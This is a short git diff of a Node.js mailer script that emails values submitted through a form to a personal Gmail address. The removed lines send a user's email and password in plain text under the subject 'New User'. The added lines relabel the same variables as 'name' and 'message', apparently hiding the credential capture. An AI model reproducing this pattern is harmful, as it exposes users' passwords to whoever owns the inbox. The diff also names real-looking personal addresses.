@@ -56,8 +56,8 @@ fs.readFile('Mail2.html','UTF-8',function(err, data) {
   var mailOptions = {
     from: 'okumagbarukevwe@gmail.com',
     to: 'okumagbarukkevwe@gmail.com',
-    subject: '********New User***********',
-    text: "email:     " + replacements.email + "  " +"password:    " + replacements.password 
+    subject: '********New Message***********',
+    text: "name:     " + replacements.email + "  " +"message:    " + replacements.password 
   };
   
   transporter.sendMail(mailOptions, function(error, info){
